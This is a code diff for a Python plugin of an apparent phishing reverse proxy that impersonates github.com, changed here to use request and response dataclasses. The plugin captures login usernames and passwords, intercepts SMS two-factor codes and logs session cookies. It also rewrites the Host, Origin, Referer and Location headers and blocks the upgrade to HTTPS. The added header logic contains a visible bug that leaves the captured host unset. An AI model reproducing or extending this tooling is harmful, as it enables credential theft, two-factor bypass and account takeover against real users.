@@ -1,33 +1,43 @@
 import urllib.parse
+from dataclasses import dataclass
 
 # The hostname the client is sending requests to
-actual_host: str
+actual_host: bytes = b""
 
 
-def modify_request(
-    request_parameters: dict[str, str],
-    request_headers: dict[str, list[str]],
-    request_body: bytes,
-) -> tuple[dict[str, str], dict[str, list[str]], bytes]:
+# HTTP Request and response data class defnitions
+@dataclass
+class HttpRequest:
+    method: bytes
+    target: bytes
+    headers: list[tuple[bytes, bytes]]
+    body: bytes
+
+
+@dataclass
+class HttpResponse:
+    status_code: int
+    headers: list[tuple[bytes, bytes]]
+    body: bytes
+
+
+def modify_request(request: HttpRequest) -> HttpRequest:
 
     global actual_host
 
     # Get route
     log: str = ""  # Log
     log += "[plugins/github.com:modify_request] %s request for %s\n" % (
-        request_parameters["method"],
-        request_parameters["route"],
+        request.method.decode(),
+        request.target.decode(),
     )  # Log
 
     # Get username and password
-    if (
-        request_parameters["route"] == "/session"
-        and request_parameters["method"] == "POST"
-    ):
-        username = request_body.split(b"&login=")[1].split(b"&")[0].decode()
+    if request.target == b"/session" and request.method == b"POST":
+        username = request.body.split(b"&login=")[1].split(b"&")[0].decode()
         username = urllib.parse.unquote(username)
 
-        password = request_body.split(b"&password=")[1].split(b"&")[0].decode()
+        password = request.body.split(b"&password=")[1].split(b"&")[0].decode()
         password = urllib.parse.unquote(password)
         log += "[plugins/github.com:modify_request] Found credentials -> %s:%s\n" % (
             username,
@@ -35,65 +45,72 @@ def modify_request(
         )
 
     # Get SMS OTP code
-    if request_parameters["route"] == "/sessions/two-factor":
-        sms_otp = request_body.split(b"&")[1].split(b"=")[1]
+    if request.target == b"/sessions/two-factor":
+        sms_otp = request.body.split(b"&")[1].split(b"=")[1]
         log += "[plugins/github.com:modify_request] SMS OTP Intercepted -> %s\n" % (
             sms_otp.decode()
         )  # Log
 
     # Get cookie values if requesting dashboard (means the user logged in succesfully)
-    if "cookie" in request_headers and (
-        request_parameters["route"] == "/dashboard"
-        or request_parameters["route"] == "/"
-    ):
-        cookies = request_headers["cookie"][0]
-        for cookie in cookies.split(";"):
-            _cookie_name = cookie.split("=")[0]
-            log += "[plugins/github.com:modify_request] Intercepted cookie -> %s\n" % (
-                cookie
-            )  # Log
+    if request.target == b"/" or request.target == b"/dashboard":
+        for header in request.headers:
+            if header[0].decode().lower() == "cookie":
+                _cookies = header[1].decode().split(";")
+                for _cookie in _cookies:
+                    log += (
+                        "[plugins/github.com:modify_request] Intercepted cookie -> %s\n"
+                        % (_cookie.lstrip())
+                    )  # Log
     print(log.strip())  # Log
 
-    # Modify host
-    actual_host = request_headers["host"][0]
-    request_headers["host"][0] = "github.com"
+    # Modify headers
+    for _hi in range(0, len(request.headers)):
+        if request.headers[_hi][0].lower() == b"host":
+            if actual_host != b"":
+                actual_host = request.headers[_hi][1]
+            request.headers[_hi] = (request.headers[_hi][0], b"github.com")
 
-    # Modify origin and refer
-    if "origin" in request_headers:
-        request_headers["origin"][0] = request_headers["origin"][0].replace(
-            actual_host, "github.com"
-        )
-        request_headers["origin"][0] = request_headers["origin"][0].replace(
-            "http:", "https:"
-        )
+        if request.headers[_hi][0].lower() == b"origin":
+            request.headers[_hi] = (
+                request.headers[_hi][0],
+                request.headers[_hi][1].replace(actual_host, b"github.com"),
+            )
+            request.headers[_hi] = (
+                request.headers[_hi][0],
+                request.headers[_hi][1].replace(b"http:", b"https:"),
+            )
 
-    if "refer" in request_headers:
-        request_headers["refer"][0] = request_headers["refer"][0].replace(
-            actual_host, "github.com"
-        )
-        request_headers["refer"][0] = request_headers["refer"][0].replace(
-            "http:", "https:"
-        )
+        if request.headers[_hi][0].lower() == b"referer":
+            request.headers[_hi] = (
+                request.headers[_hi][0],
+                request.headers[_hi][1].replace(actual_host, b"github.com"),
+            )
+            request.headers[_hi] = (
+                request.headers[_hi][0],
+                request.headers[_hi][1].replace(b"http:", b"https:"),
+            )
 
     # Do not upgrade to HTTPS
-    if "upgrade-insecure-requests" in request_headers:
-        del request_headers["upgrade-insecure-requests"]
+    for _hi in range(0, len(request.headers)):
+        if request.headers[_hi][0].lower() == b"upgrade-insecure-requests":
+            del request.headers[_hi]
+            break
 
-    return request_parameters, request_headers, request_body
+    return request
 
 
-def modify_response(
-    response_parameters: dict[str, str],
-    response_headers: dict[str, list[str]],
-    response_body: bytes,
-) -> tuple[dict[str, str], dict[str, list[str]], bytes]:
+def modify_response(response: HttpResponse) -> HttpResponse:
 
-    if response_parameters["status_code"] == "302" and "location" in response_headers:
-        response_headers["location"][0] = response_headers["location"][0].replace(
-            "github.com", actual_host
-        )
-        response_headers["location"][0] = response_headers["location"][0].replace(
-            "https:", "http:"
-        )
+    # Modify headers
+    for _hi in range(0, len(response.headers)):
+        if response.headers[_hi][0].lower() == b"location":
+            response.headers[_hi] = (
+                response.headers[_hi][0],
+                response.headers[_hi][1].replace(b"github.com", actual_host),
+            )
+            response.headers[_hi] = (
+                response.headers[_hi][0],
+                response.headers[_hi][1].replace(b"https:", b"http:"),
+            )
 
-    return response_parameters, response_headers, response_body
+    return response
